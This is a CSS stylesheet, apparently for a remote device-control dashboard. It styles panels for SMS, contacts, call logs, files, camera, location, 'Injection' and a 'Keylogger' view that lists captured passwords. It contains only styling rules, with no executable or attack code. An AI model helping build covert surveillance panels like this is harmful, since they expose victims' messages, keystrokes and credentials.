.hw-privacy-note b{display:block;font-size:9.5px;letter-spacing:1.1px;text-transform:uppercase;color:#9fe8ff;margin-bottom:2px}
.hw-privacy-note.warn{border-color:rgba(251,191,36,.45)}
.hw-privacy-note.warn .material-symbols-outlined{color:var(--warning)}
.hw-privacy-note.warn b{color:#f6d68a}
.hw-privacy-retry{margin-top:6px;font-size:9.5px;font-weight:700;letter-spacing:.5px;text-transform:uppercase;
  color:#08111a;background:linear-gradient(90deg,var(--primary),var(--primary-2));border-radius:8px;padding:4px 8px}
.hw-privacy-retry:hover{filter:brightness(1.08)}
/* WebP frame viewer: a plain <img> that fills the screen area, scaled to fit.
   Separate from the H.264 canvas so the two renderers never collide. */
.hw-webp-frame{max-width:100%;max-height:100%;width:auto;height:auto;object-fit:contain;user-select:none;-webkit-user-drag:none;display:block}
button:focus-visible,.hw-scread-btn:focus-visible{outline:2px solid var(--primary-2);outline-offset:2px}
/* ---- Start menu (mode picker), anchored to the Start button ---- */
.hbnc-ws{position:relative}
.hw-start-wrap{position:relative}
#hwStartMenu{display:none;position:absolute;bottom:calc(100% + 8px);left:0;z-index:60;background:var(--bg2);border:1px solid var(--border);border-radius:var(--radius2);box-shadow:0 12px 32px rgba(0,0,0,0.5);min-width:244px;overflow:hidden;animation:hwPop .14s ease}
@keyframes hwPop{from{opacity:0;transform:translateY(6px) scale(.98)}to{opacity:1;transform:none}}
/* ---- Premium quality selector (real SCRQuality -> bitrate axis) ---- */
.hw-qual{position:relative}
.hw-qual-btn{display:inline-flex;align-items:center;gap:6px;padding:6px 10px;background:linear-gradient(135deg,rgba(255,255,255,0.08),rgba(255,255,255,0.03));border:1px solid var(--border);border-radius:var(--radius2);font-size:12px;color:var(--text);cursor:pointer;transition:all .15s;font-family:inherit}
.hw-qual-btn:hover{border-color:rgba(94,231,255,0.5);box-shadow:0 0 0 1px rgba(94,231,255,0.15)}
.hw-qual-btn .material-symbols-outlined{font-size:15px;color:var(--text3)}
.hw-qual-btn .hw-qual-caret{font-size:16px;margin-left:-2px}
.hw-qual-val{font-weight:600;color:var(--text)}
.hw-qual-menu{display:none;position:absolute;bottom:calc(100% + 8px);right:0;z-index:60;background:var(--bg2);border:1px solid var(--border);border-radius:var(--radius2);box-shadow:0 12px 32px rgba(0,0,0,0.5);min-width:196px;overflow:hidden;animation:hwPop .14s ease}
.hw-qual-menu.open{display:block}
.hw-qual-opt{display:flex;align-items:center;justify-content:space-between;min-height:42px;padding:9px 12px;cursor:pointer;color:var(--text2);font-size:12px;transition:background .12s,color .12s}
.hw-qual-opt span{font-size:10px;color:var(--text3)}
.hw-qual-opt:hover{background:rgba(255,255,255,0.06);color:var(--text)}
.hw-qual-opt.active{color:var(--text);background:rgba(94,231,255,0.10);box-shadow:inset 2px 0 0 var(--primary-2)}
.hw-qual-custom{display:flex;gap:6px;padding:8px 10px;border-top:1px solid var(--border)}
.hw-qual-custom input{flex:1;min-width:0;padding:5px 8px;background:rgba(255,255,255,0.06);border:1px solid var(--border);border-radius:var(--radius2);color:var(--text);font-size:12px}
.hw-qual-custom button{padding:5px 10px;background:var(--red);color:#fff;border:none;border-radius:var(--radius2);font-size:11px;cursor:pointer}
.hw-qual-note{padding:6px 12px;font-size:10px;color:var(--text3);border-top:1px solid var(--border)}
.hw-qual-menu .hw-quality-state{padding:4px 12px 8px}
/* ---- Full-screen live dashboard: controls float as transparent overlays ---- */
.hbnc-ws.hw-fs .hbnc-ws-hdr{position:absolute;top:0;left:0;right:0;z-index:12;background:linear-gradient(180deg,rgba(0,0,0,0.55),transparent);border-bottom:none;padding:10px 14px;pointer-events:none}
.hbnc-ws.hw-fs .hbnc-ws-hdr .hbnc-ws-ctrls,.hbnc-ws.hw-fs .hbnc-ws-hdr .dot,.hbnc-ws.hw-fs .hbnc-ws-hdr .hbnc-ws-label{pointer-events:auto}
.hbnc-ws.hw-fs .hbnc-ws-hdr .hbnc-ws-label{text-shadow:0 1px 3px rgba(0,0,0,0.85)}
.hbnc-ws.hw-fs .hbnc-ws-body{position:absolute;inset:0;z-index:1;background:#000}
.hbnc-ws.hw-fs .hbnc-ws-bar{position:absolute;left:0;right:0;bottom:0;z-index:12;background:linear-gradient(0deg,rgba(0,0,0,0.62),transparent);border-top:none;padding:12px 10px;backdrop-filter:blur(2px)}
.hbnc-ws.hw-fs .hbnc-ws-action,.hbnc-ws.hw-fs .hw-qual-btn,.hbnc-ws.hw-fs .hw-scread-btn,.hbnc-ws.hw-fs .hw-quality-sel{background:rgba(255,255,255,0.08);backdrop-filter:blur(8px);border-color:rgba(255,255,255,0.12);color:#fff}
.hbnc-ws.hw-fs .hbnc-ws-action.danger{background:rgba(229,57,53,0.22)}
.conn-status{display:flex;align-items:center;gap:6px;padding:6px 10px;font-size:11px;color:var(--text3);border-top:1px solid var(--border);flex-shrink:0}

/* ---- More Menu Panel (HBNC) ---- */
.moremenu-backdrop{display:none;position:fixed;inset:0;z-index:199}
.moremenu-backdrop.open{display:block}
.moremenu{position:fixed;top:0;right:-260px;width:260px;height:100dvh;background:var(--bg2);border-left:1px solid var(--border);z-index:200;overflow-y:auto;transition:right .3s ease;display:flex;flex-direction:column}
.moremenu.open{right:0}
.moremenu-hdr{display:flex;align-items:center;padding:14px 16px;border-bottom:1px solid var(--border);font-size:14px;font-weight:600;color:var(--text);gap:8px}
.moremenu-hdr .material-symbols-outlined{font-size:16px;color:var(--red)}
.moremenu-close{margin-left:auto;width:28px;height:28px;display:flex;align-items:center;justify-content:center;border-radius:var(--radius2);color:var(--text3);cursor:pointer}
.moremenu-close:hover{background:rgba(255,255,255,0.07);color:var(--text)}
.moremenu-section{font-size:10px;font-weight:600;letter-spacing:1px;color:var(--text3);padding:10px 14px 4px;text-transform:uppercase}
.moremenu-item{display:flex;align-items:center;gap:10px;padding:9px 14px;cursor:pointer;font-size:13px;color:var(--text2);transition:background .15s,color .15s;border:none;background:none;width:100%;text-align:left}
.moremenu-item:hover{background:rgba(255,255,255,0.05);color:var(--text)}
.moremenu-item .material-symbols-outlined{font-size:16px;color:var(--text3);flex-shrink:0}

/* ---- Sidebar mobile overlay ---- */
.sidebar-backdrop{display:none;position:fixed;inset:0;background:rgba(0,0,0,0.5);z-index:99;backdrop-filter:blur(2px)}
.sidebar-backdrop.open{display:block}
@media(max-width:768px){
  .sidebar{position:fixed;top:0;left:-220px;height:100dvh;z-index:100;transition:left .3s ease}
  .sidebar.open{left:0}
  .topbar-menu{display:flex}
    .content{padding:14px}
    .panel-hdr h2{font-size:15px}
    .btn{min-height:38px;padding:8px 12px}
    .btn-sm{min-height:34px}
    .btn-row,.panel-actions{width:100%}
    .btn-row .btn,.panel-actions .btn{flex:1 1 auto;justify-content:center}
    .toast-container{left:14px;right:14px;bottom:14px}
    .toast{min-width:0;max-width:none}
}

/* ---- Device workspace ---- */
.device-ws{display:none;background:var(--bg);border:1px solid var(--border);border-radius:var(--radius);overflow:hidden;margin-top:12px}
.device-ws.open{display:block}
.device-ws-tabs{display:flex;border-bottom:1px solid var(--border);overflow-x:auto}
.device-ws-tab{padding:10px 16px;font-size:12px;font-weight:500;color:var(--text3);cursor:pointer;white-space:nowrap;border-bottom:2px solid transparent;transition:color .15s,border-color .15s}
.device-ws-tab:hover{color:var(--text)}
.device-ws-tab.active{color:var(--red);border-bottom-color:var(--red)}
.device-ws-body{padding:16px}
.device-ws-section{display:none}
.device-ws-section.active{display:block}

/* ---- Table ---- */
table{width:100%;border-collapse:collapse;font-size:13px}
th,td{padding:9px 12px;text-align:left;border-bottom:1px solid var(--border)}
th{color:var(--text3);font-weight:500;font-size:11px;text-transform:uppercase;letter-spacing:0.5px;background:rgba(255,255,255,0.02)}
td{color:var(--text2)}
tr:last-child td{border-bottom:none}
tr:hover td{background:rgba(255,255,255,0.02)}

/* ---- Empty state ---- */
.empty{text-align:center;padding:32px 16px;color:var(--text3);font-size:13px}
.empty .material-symbols-outlined{font-size:40px;opacity:0.3;display:block;margin-bottom:8px}

/* ---- Form rows ---- */
.form-row{display:flex;flex-direction:column;gap:8px;margin-bottom:12px}
.form-label{font-size:12px;color:var(--text2);font-weight:500}

/* ---- SMS ---- */
.sms-threads{display:flex;flex-direction:column}
.sms-thread{display:flex;align-items:center;gap:10px;padding:12px;border-bottom:1px solid var(--border);cursor:pointer;transition:background .15s}
.sms-thread:hover{background:rgba(255,255,255,0.03)}
.sms-avatar{width:36px;height:36px;border-radius:50%;background:var(--red3);border:1px solid var(--border2);display:flex;align-items:center;justify-content:center;font-size:14px;font-weight:600;color:var(--red);flex-shrink:0}
.sms-info{flex:1;min-width:0}
.sms-name{font-size:13px;font-weight:500;color:var(--text)}
.sms-preview{font-size:12px;color:var(--text3);white-space:nowrap;overflow:hidden;text-overflow:ellipsis;margin-top:2px}
.sms-time{font-size:11px;color:var(--text3)}
.sms-conv{display:none;flex-direction:column;height:100%}
.sms-conv.open{display:flex}
.sms-conv-hdr{display:flex;align-items:center;gap:10px;padding:10px 12px;border-bottom:1px solid var(--border);flex-shrink:0}
.sms-messages{flex:1;overflow-y:auto;padding:12px;display:flex;flex-direction:column;gap:8px;min-height:200px;max-height:400px}
.sms-msg{max-width:75%;padding:8px 12px;border-radius:12px;font-size:13px;line-height:1.4}
.sms-msg.recv{background:var(--bg3);color:var(--text);align-self:flex-start;border-bottom-left-radius:3px}
.sms-msg.sent{background:var(--red3);color:var(--text);align-self:flex-end;border-bottom-right-radius:3px;border:1px solid var(--border2)}
.sms-msg-time{font-size:10px;color:var(--text3);margin-top:3px}
.sms-compose{padding:10px;border-top:1px solid var(--border);display:flex;gap:6px;flex-shrink:0}
.sms-compose input{flex:1}
.sms-send{width:36px;height:36px;background:var(--red);color:#fff;border-radius:var(--radius2);display:flex;align-items:center;justify-content:center;cursor:pointer;flex-shrink:0}
.sms-send .material-symbols-outlined{font-size:16px}

/* ---- Contacts ---- */
.contacts-list{display:flex;flex-direction:column}
.contact-item{display:flex;align-items:center;gap:10px;padding:10px 12px;border-bottom:1px solid var(--border);transition:background .15s}
.contact-item:hover{background:rgba(255,255,255,0.03)}
.contact-av{width:34px;height:34px;border-radius:50%;background:var(--red3);border:1px solid var(--border2);display:flex;align-items:center;justify-content:center;font-size:13px;font-weight:600;color:var(--red);flex-shrink:0}
.contact-info{flex:1}
.contact-name{font-size:13px;font-weight:500;color:var(--text)}
.contact-phone{font-size:12px;color:var(--text3)}
.contact-btns{display:flex;gap:4px}
.contact-btn{width:28px;height:28px;display:flex;align-items:center;justify-content:center;border-radius:var(--radius2);color:var(--text3);background:rgba(255,255,255,0.04);cursor:pointer;transition:all .15s}
.contact-btn:hover{background:var(--red3);color:var(--red)}
.contact-btn .material-symbols-outlined{font-size:14px}

/* ---- Call log ---- */
.call-item{display:flex;align-items:center;gap:10px;padding:10px 12px;border-bottom:1px solid var(--border)}
.call-type{width:32px;height:32px;border-radius:50%;display:flex;align-items:center;justify-content:center;flex-shrink:0}
.call-type.out{background:rgba(76,175,80,0.15);color:var(--online)}
.call-type.in{background:rgba(33,150,243,0.12);color:#2196f3}
.call-type.missed{background:rgba(229,57,53,0.12);color:var(--red)}
.call-type .material-symbols-outlined{font-size:15px}
.call-info{flex:1}
.call-name{font-size:13px;font-weight:500;color:var(--text)}
.call-meta{font-size:11px;color:var(--text3)}
.call-btn{width:28px;height:28px;display:flex;align-items:center;justify-content:center;border-radius:var(--radius2);background:rgba(255,255,255,0.04);color:var(--text3);cursor:pointer}
.call-btn:hover{background:var(--red3);color:var(--red)}
.call-btn .material-symbols-outlined{font-size:14px}

/* ---- Apps ---- */
.app-grid{display:grid;grid-template-columns:1fr;gap:6px}
.app-item{display:flex;align-items:center;gap:10px;padding:10px 12px;background:var(--bg3);border:1px solid var(--border);border-radius:var(--radius2);transition:border-color .15s}
.app-item:hover{border-color:var(--border2)}
.app-icon{width:32px;height:32px;background:var(--red3);border-radius:8px;display:flex;align-items:center;justify-content:center;font-size:13px;font-weight:700;color:var(--red);flex-shrink:0;border:1px solid var(--border2)}
.app-info{flex:1;min-width:0}
.app-name{font-size:13px;font-weight:500;color:var(--text);white-space:nowrap;overflow:hidden;text-overflow:ellipsis}
.app-pkg{font-size:11px;color:var(--text3);white-space:nowrap;overflow:hidden;text-overflow:ellipsis}
.app-cat{font-size:10px;padding:2px 6px;border-radius:10px;letter-spacing:.2px;flex-shrink:0}
.app-cat.c-user{background:rgba(74,151,255,.14);color:#4a97ff}
.app-cat.c-system{background:rgba(255,158,74,.14);color:#ff9e4a;border:1px solid rgba(255,158,74,.25)}
.apps-filter{display:flex;gap:6px;margin:-6px 0 10px}
.af-chip{padding:5px 12px;font-size:11px;border-radius:14px;background:var(--bg3);border:1px solid var(--border);color:var(--text3);cursor:pointer;font-weight:500;transition:all .15s}
.af-chip:hover{border-color:var(--border2);color:var(--text)}
.af-chip.af-active{background:var(--red);border-color:var(--red);color:#fff}
.app-btns{display:flex;gap:3px}
.app-btn{width:26px;height:26px;display:flex;align-items:center;justify-content:center;border-radius:var(--radius2);background:rgba(255,255,255,0.04);color:var(--text3);cursor:pointer;transition:all .15s}
.app-btn:hover{background:var(--red3);color:var(--red)}
.app-btn .material-symbols-outlined{font-size:13px}

/* ---- Files ---- */
.file-item{display:flex;align-items:center;gap:10px;padding:9px 12px;border-bottom:1px solid var(--border);transition:background .15s}
.file-item:hover{background:rgba(255,255,255,0.03)}
.file-ico{width:28px;height:28px;display:flex;align-items:center;justify-content:center;color:var(--text3);flex-shrink:0}
.file-ico.dir{color:var(--warn)}
.file-ico .material-symbols-outlined{font-size:18px}
.file-name{font-size:13px;color:var(--text);flex:1;cursor:pointer}
.file-name:hover{color:var(--red)}
.file-size{font-size:11px;color:var(--text3)}
.file-btns{display:flex;gap:3px}
.file-btn{width:26px;height:26px;display:flex;align-items:center;justify-content:center;border-radius:var(--radius2);background:rgba(255,255,255,0.04);color:var(--text3);cursor:pointer}
.file-btn:hover{background:var(--red3);color:var(--red)}
.file-btn .material-symbols-outlined{font-size:13px}
.file-path{font-size:12px;color:var(--text3);padding:6px 12px;background:rgba(255,255,255,0.02);border-bottom:1px solid var(--border)}
.file-editor-wrap{margin-top:10px}
.file-editor-hdr{display:flex;align-items:center;gap:8px;margin-bottom:6px}
.file-editor-hdr span{font-size:12px;color:var(--text2);flex:1}
textarea.code{font-family:'Courier New',monospace;font-size:12px;min-height:200px;resize:vertical}

/* ---- Keylogger ---- */
.kl-stats{display:flex;gap:12px;margin-bottom:12px;flex-wrap:wrap}
.kl-stat{background:var(--bg3);border:1px solid var(--border);border-radius:var(--radius2);padding:10px 14px;text-align:center}
.kl-stat-val{font-size:20px;font-weight:700;color:var(--red)}
.kl-stat-lbl{font-size:11px;color:var(--text3);margin-top:2px}
.kl-entries{display:flex;flex-direction:column;gap:4px;max-height:300px;overflow-y:auto;margin-top:8px}
.kl-entry{padding:6px 10px;background:var(--bg3);border:1px solid var(--border);border-radius:var(--radius2);font-size:12px;color:var(--text2);font-family:monospace}
.kl-pass{display:flex;align-items:center;gap:10px;padding:8px 10px;background:var(--bg3);border:1px solid var(--border);border-radius:var(--radius2);margin-bottom:4px}
.kl-pass-app{font-size:11px;color:var(--text3);min-width:100px}
.kl-pass-val{font-size:13px;color:var(--red);font-family:monospace}

/* ---- Notifications ---- */
.notif-item{display:flex;gap:10px;padding:10px 12px;border-bottom:1px solid var(--border);transition:background .15s}
.notif-item:hover{background:rgba(255,255,255,0.02)}
.notif-ico{width:32px;height:32px;background:var(--red3);border:1px solid var(--border2);border-radius:8px;display:flex;align-items:center;justify-content:center;font-size:13px;font-weight:700;color:var(--red);flex-shrink:0}
.notif-info{flex:1}
.notif-title{font-size:13px;font-weight:500;color:var(--text)}
.notif-msg{font-size:12px;color:var(--text2);margin-top:2px}
.notif-time{font-size:11px;color:var(--text3);margin-top:2px}

/* ---- Camera ---- */
.camera-preview{background:#000;border-radius:var(--radius);overflow:hidden;aspect-ratio:16/9;display:flex;align-items:center;justify-content:center;margin-bottom:10px;max-width:540px}
.camera-preview img{width:100%;height:100%;object-fit:contain}

/* ---- Location ---- */
.loc-hero{display:flex;flex-direction:column;gap:14px}
.loc-head{display:flex;align-items:flex-start;justify-content:space-between;gap:16px;flex-wrap:wrap;padding:18px 20px;border:1px solid rgba(124,92,255,.22);border-radius:20px;background:linear-gradient(135deg,rgba(124,92,255,.15),rgba(94,231,255,.05) 58%,rgba(12,22,35,.9));box-shadow:0 16px 36px rgba(3,8,20,.34)}
.loc-title{font-size:22px;font-weight:700;letter-spacing:-.5px;margin-top:4px;color:var(--text)}
.loc-sub{font-size:12.5px;color:var(--text2);margin-top:4px;max-width:560px;line-height:1.55}
.loc-actions{display:flex;gap:8px;flex-wrap:wrap}
.loc-card{border:1px solid var(--border);border-radius:18px;background:linear-gradient(180deg,rgba(16,29,45,.92),rgba(11,18,29,.92));overflow:hidden;box-shadow:var(--shadow)}
.loc-display{padding:16px 18px;font-size:13px;color:var(--text2)}
.loc-empty{display:flex;flex-direction:column;align-items:center;gap:6px;padding:26px 10px;text-align:center;color:var(--text3);font-size:12px}
.loc-empty .material-symbols-outlined{font-size:30px;color:rgba(124,92,255,.75)}
.loc-empty b{font-size:14px;color:var(--text2)}
.loc-grid{display:grid;grid-template-columns:repeat(auto-fit,minmax(132px,1fr));gap:10px}
.loc-tile{background:rgba(255,255,255,.03);border:1px solid var(--border);border-radius:12px;padding:10px 12px;min-width:0}
.loc-tile-k{font-size:9.5px;letter-spacing:1.2px;text-transform:uppercase;color:var(--text3)}
.loc-tile-v{font-size:14px;font-weight:600;font-family:'IBM Plex Mono',monospace;color:var(--text);margin-top:4px;word-break:break-all}
.loc-tile.wide{grid-column:span 2}
.loc-map-wrap{border:1px solid var(--border);border-radius:18px;overflow:hidden;background:#000;box-shadow:var(--shadow)}
.loc-map-wrap iframe{width:100%;height:320px;border:0;display:block;filter:saturate(.85)}
.loc-row{display:flex;gap:10px;align-items:center;padding:7px 0;border-bottom:1px solid rgba(255,255,255,.04)}
.loc-row:last-child{border-bottom:0}
.loc-key{font-size:11px;color:var(--text3);min-width:88px;letter-spacing:.4px}
@media (max-width:640px){
  .loc-head{padding:16px}
  .loc-title{font-size:19px}
  .loc-actions{width:100%}
  .loc-actions .perm-refresh{flex:1;justify-content:center}
  .loc-map-wrap iframe{height:240px}
}

/* ---- Injection ---- */
.inject-list{display:flex;flex-direction:column;gap:6px}
.inject-item{display:flex;align-items:center;gap:10px;padding:10px 12px;background:var(--bg3);border:1px solid var(--border);border-radius:var(--radius2);transition:border-color .15s}
.inject-item:hover{border-color:var(--border2)}
.inject-item-name{flex:1;font-size:13px;color:var(--text)}
.inject-item-btns{display:flex;gap:4px}
.inject-badge{font-size:10px;padding:2px 7px;border-radius:10px;border:1px solid var(--border);color:var(--text3)}
.inject-badge.active{border-color:var(--border2);color:var(--red);background:var(--red3)}

/* ---- Settings ---- */
.setting-row{display:flex;align-items:center;padding:12px 0;border-bottom:1px solid var(--border);gap:12px}
.setting-label{font-size:13px;color:var(--text2);flex:1}
.setting-val{font-size:13px;color:var(--text3);font-family:monospace}

/* ---- URL modal ---- */
.modal-overlay{display:none;position:fixed;inset:0;background:rgba(0,0,0,0.7);z-index:999;align-items:center;justify-content:center;backdrop-filter:blur(3px)}
.modal-overlay.open{display:flex}
.modal{background:var(--bg2);border:1px solid var(--border);border-radius:var(--radius);width:90%;max-width:440px;overflow:hidden}
.modal-hdr{display:flex;align-items:center;padding:14px 16px;border-bottom:1px solid var(--border);font-size:14px;font-weight:600;color:var(--text);gap:8px}
.modal-body{padding:16px;display:flex;flex-direction:column;gap:10px}
.modal-footer{display:flex;gap:8px;padding:12px 16px;border-top:1px solid var(--border);justify-content:flex-end}
.modal-close{margin-left:auto;width:28px;height:28px;display:flex;align-items:center;justify-content:center;border-radius:var(--radius2);color:var(--text3);cursor:pointer;font-size:18px}
.modal-close:hover{background:rgba(255,255,255,0.07)}
.modal-info{font-size:12px;color:var(--text3)}
.modal-err{font-size:12px;color:#f44336;display:none}

/* ---- Options panel ---- */
.options-form{display:flex;flex-direction:column;gap:10px}
.opt-row{display:flex;align-items:center;gap:10px;padding:8px 0;border-bottom:1px solid var(--border)}
.opt-label{font-size:13px;color:var(--text2);flex:1}
.opt-val{font-size:12px;color:var(--text3)}
input[type=checkbox]{width:auto;accent-color:var(--red)}
input[type=range]{padding:4px 0;accent-color:var(--red)}

/* ---- Permissions auditor ---- */
.perm-hero{position:relative;display:flex;gap:20px;justify-content:space-between;align-items:stretch;padding:20px 22px;margin-bottom:14px;border:1px solid rgba(124,92,255,.24);border-radius:22px;background:linear-gradient(135deg,rgba(124,92,255,.17),rgba(94,231,255,.06) 54%,rgba(12,22,35,.92));box-shadow:0 20px 44px rgba(3,8,20,.42);overflow:hidden}
.perm-hero:before{content:'';position:absolute;width:320px;height:320px;right:-90px;top:-170px;background:radial-gradient(circle,rgba(94,231,255,.22),transparent 65%);pointer-events:none}
.perm-hero-body{position:relative;flex:1;min-width:0}
.perm-kicker{display:flex;align-items:center;gap:7px;font-size:9.5px;font-weight:700;letter-spacing:1.6px;text-transform:uppercase;color:var(--primary-2)}
.perm-kicker .material-symbols-outlined{font-size:15px}
.perm-score{display:flex;align-items:baseline;gap:8px;margin-top:6px;font-family:'IBM Plex Mono',monospace;font-size:44px;line-height:1;font-weight:500;letter-spacing:-2px;color:#fff}
.perm-score-total{font-size:17px;letter-spacing:0;color:var(--text3);font-weight:400}
.perm-score-label{font-size:12.5px;color:var(--text2);margin-top:5px}
.perm-meter{position:relative;height:7px;border-radius:99px;background:rgba(255,255,255,.07);overflow:hidden;margin-top:12px;max-width:440px}
.perm-meter span{display:block;height:100%;width:0%;border-radius:99px;background:linear-gradient(90deg,var(--primary),var(--primary-2));box-shadow:0 0 16px rgba(94,231,255,.55);transition:width .55s cubic-bezier(.22,1,.36,1)}
.perm-meta{display:flex;align-items:center;gap:10px;margin-top:12px;flex-wrap:wrap}
.perm-chip{display:inline-flex;align-items:center;gap:5px;font-size:11px;color:var(--text2);background:rgba(255,255,255,.045);border:1px solid var(--border);padding:4px 9px;border-radius:99px;max-width:100%}
.perm-chip .material-symbols-outlined{font-size:13px;color:var(--primary-2)}
.perm-stamp{font-size:10.5px;color:var(--text3);font-family:'IBM Plex Mono',monospace}
.perm-hero-side{display:flex;flex-direction:column;justify-content:space-between;align-items:flex-end;gap:12px;position:relative}
.perm-refresh{display:inline-flex;align-items:center;gap:7px;padding:9px 14px;border-radius:12px;background:rgba(255,255,255,.05);border:1px solid rgba(124,92,255,.34);color:var(--text);font-size:12px;font-weight:600;transition:.18s}
.perm-refresh:hover{background:rgba(124,92,255,.18);border-color:rgba(124,92,255,.62);transform:translateY(-1px)}
.perm-refresh:disabled{opacity:.5;cursor:wait;transform:none}
.perm-refresh .material-symbols-outlined{font-size:16px;color:var(--primary-2)}
.perm-refresh.danger{border-color:rgba(255,95,125,.35);color:#ffb7c3}
.perm-refresh.danger .material-symbols-outlined{color:#ff8fa3}
.perm-refresh.danger:hover{background:rgba(255,95,125,.14)}
.perm-legend{display:flex;gap:12px;font-size:10px;color:var(--text3);letter-spacing:.4px}
.perm-legend span{display:inline-flex;align-items:center;gap:5px}
.perm-legend i{width:7px;height:7px;border-radius:50%;display:inline-block}
.perm-legend i.ok{background:var(--online);box-shadow:0 0 8px rgba(61,213,152,.7)}
.perm-legend i.off{background:var(--danger);box-shadow:0 0 8px rgba(255,95,125,.65)}
.perm-note{display:flex;gap:10px;align-items:flex-start;padding:12px 14px;margin-bottom:12px;border-radius:14px;border:1px solid rgba(251,191,36,.32);background:rgba(251,191,36,.07);color:#f6d68a;font-size:12px;line-height:1.5}
.perm-note .material-symbols-outlined{font-size:16px;flex-shrink:0}
.perm-note[hidden]{display:none!important}
.perm-groups{display:flex;flex-direction:column;gap:14px}
.perm-group{border:1px solid var(--border);border-radius:18px;background:linear-gradient(180deg,rgba(16,29,45,.9),rgba(11,18,29,.9));overflow:hidden;box-shadow:0 10px 24px rgba(2,6,23,.18)}
.perm-group-hdr{display:flex;align-items:center;gap:8px;padding:11px 16px;border-bottom:1px solid var(--border);background:rgba(255,255,255,.015)}
.perm-group-hdr .material-symbols-outlined{font-size:16px;color:var(--primary-2)}
.perm-group-name{font-size:10.5px;font-weight:700;letter-spacing:1.4px;text-transform:uppercase;color:var(--text2)}
.perm-group-count{margin-left:auto;font-size:10.5px;color:var(--text3);font-family:'IBM Plex Mono',monospace}
.perm-row{display:grid;grid-template-columns:34px minmax(0,1fr) auto auto;align-items:center;gap:12px;padding:11px 16px;border-bottom:1px solid rgba(255,255,255,.035);transition:background .16s}
.perm-row:last-child{border-bottom:0}
.perm-row:hover{background:rgba(124,92,255,.055)}
.perm-row-icon{width:34px;height:34px;border-radius:10px;display:flex;align-items:center;justify-content:center;background:rgba(255,255,255,.04);border:1px solid var(--border);color:var(--text3)}
.perm-row-icon .material-symbols-outlined{font-size:17px}
.perm-row.granted .perm-row-icon{color:var(--online);border-color:rgba(61,213,152,.28);background:rgba(61,213,152,.08)}
.perm-row.denied .perm-row-icon{color:#ff8fa3;border-color:rgba(255,95,125,.25);background:rgba(255,95,125,.07)}
.perm-copy{min-width:0}
.perm-label{display:flex;align-items:center;gap:7px;font-size:13px;font-weight:600;color:var(--text)}
.perm-desc{font-size:11.5px;color:var(--text3);margin-top:2px;white-space:nowrap;overflow:hidden;text-overflow:ellipsis}
.perm-required{font-size:8.5px;font-weight:700;letter-spacing:.8px;text-transform:uppercase;color:var(--warning);border:1px solid rgba(251,191,36,.35);background:rgba(251,191,36,.08);padding:1px 6px;border-radius:99px;flex-shrink:0}
.perm-pill{font-size:10px;font-weight:700;letter-spacing:.6px;text-transform:uppercase;padding:4px 10px;border-radius:99px;border:1px solid transparent;white-space:nowrap}
.perm-pill.on{color:var(--online);border-color:rgba(61,213,152,.32);background:rgba(61,213,152,.09)}
.perm-pill.off{color:#ff9caf;border-color:rgba(255,95,125,.3);background:rgba(255,95,125,.08)}
.perm-req{display:inline-flex;align-items:center;gap:5px;padding:6px 11px;border-radius:9px;font-size:11px;font-weight:700;color:var(--text);background:rgba(124,92,255,.16);border:1px solid rgba(124,92,255,.4);transition:.16s;white-space:nowrap}
.perm-req:hover{background:rgba(124,92,255,.3);transform:translateY(-1px)}
.perm-req:disabled{opacity:.5;cursor:progress;transform:none}
.perm-req .material-symbols-outlined{font-size:14px}
.perm-req.manual{background:transparent;border-color:var(--border);color:var(--text3);cursor:not-allowed}
.perm-loading{display:flex;align-items:center;gap:10px;padding:22px 18px;border:1px dashed var(--border);border-radius:18px;color:var(--text3);font-size:12.5px}
.perm-spinner{width:14px;height:14px;border-radius:50%;border:2px solid rgba(124,92,255,.2);border-top-color:var(--primary);animation:spin .7s linear infinite;flex-shrink:0}
.perm-empty{display:flex;flex-direction:column;align-items:center;gap:6px;padding:26px 16px;text-align:center;color:var(--text3);font-size:12px;border:1px dashed var(--border);border-radius:18px}
.perm-empty .material-symbols-outlined{font-size:28px;color:rgba(124,92,255,.7)}
.perm-empty b{font-size:13.5px;color:var(--text2)}
@media (max-width:720px){
  .perm-hero{flex-direction:column;gap:14px;padding:18px}
  .perm-hero-side{flex-direction:row;align-items:center;justify-content:space-between;width:100%}
  .perm-score{font-size:38px}
  .perm-row{grid-template-columns:32px minmax(0,1fr) auto;grid-template-areas:"icon copy pill" "icon copy req";row-gap:8px}
  .perm-row-icon{grid-area:icon}
  .perm-copy{grid-area:copy}
  .perm-pill{grid-area:pill;justify-self:end}
  .perm-req{grid-area:req;justify-self:end}
  .perm-desc{white-space:normal;display:-webkit-box;-webkit-line-clamp:2;-webkit-box-orient:vertical}
}

/* ---- Device info detail ---- */
.dinfo-grid{display:grid;grid-template-columns:repeat(auto-fill,minmax(200px,1fr));gap:8px}
.dinfo-item{background:var(--bg3);border:1px solid var(--border);border-radius:var(--radius2);padding:10px 12px}
.dinfo-label{font-size:11px;color:var(--text3);margin-bottom:4px}
.dinfo-val{font-size:13px;font-weight:500;color:var(--text)}

/* ================= Phone-App UI (Dialer / Recents / Contacts / Messages) ================= */
.pa-app{display:flex;flex-direction:column;gap:10px}
.pa-tabs{display:flex;gap:8px}
.pa-tab{padding:8px 18px;border-radius:999px;background:var(--bg3);color:var(--text3);font-size:13px;font-weight:600;cursor:pointer;border:1px solid var(--border);transition:all .15s;user-select:none}
.pa-tab:hover{color:var(--text)}
.pa-tab.active{background:linear-gradient(90deg,var(--primary),var(--primary-2));color:#fff;border-color:transparent;box-shadow:0 4px 14px rgba(124,92,255,.3)}
.pa-pane{display:flex;flex-direction:column;gap:8px}
.pa-search{display:flex;align-items:center;gap:8px;background:var(--bg3);border:1px solid var(--border);border-radius:12px;padding:4px 12px}
.pa-search-ic{font-size:20px;color:var(--text3)}
.pa-search-input{flex:1;background:transparent;border:none;box-shadow:none;padding:10px 0}
.pa-search-input:focus{border:none;box-shadow:none}
.pa-count{font-size:11px;color:var(--text3);text-align:right;padding:6px 0}
.pa-av{display:flex;align-items:center;justify-content:center;width:40px;height:40px;border-radius:50%;font-size:14px;font-weight:700;flex-shrink:0;color:#0b1220;user-select:none}
.pa-av-0{background:#ffb3c1}.pa-av-1{background:#a6e3a1}.pa-av-2{background:#f9e2af}.pa-av-3{background:#89b4fa}.pa-av-4{background:#cba6f7}.pa-av-5{background:#94e2d5}.pa-av-6{background:#f38ba8}.pa-av-7{background:#fab387}
.pa-contacts{display:flex;flex-direction:column;background:var(--bg2);border:1px solid var(--border);border-radius:16px;overflow:hidden}
.pa-letter{display:flex;align-items:center;gap:8px;padding:6px 12px;font-size:11px;font-weight:700;letter-spacing:1px;color:var(--primary-2);background:rgba(124,92,255,0.06);border-bottom:1px solid var(--border)}
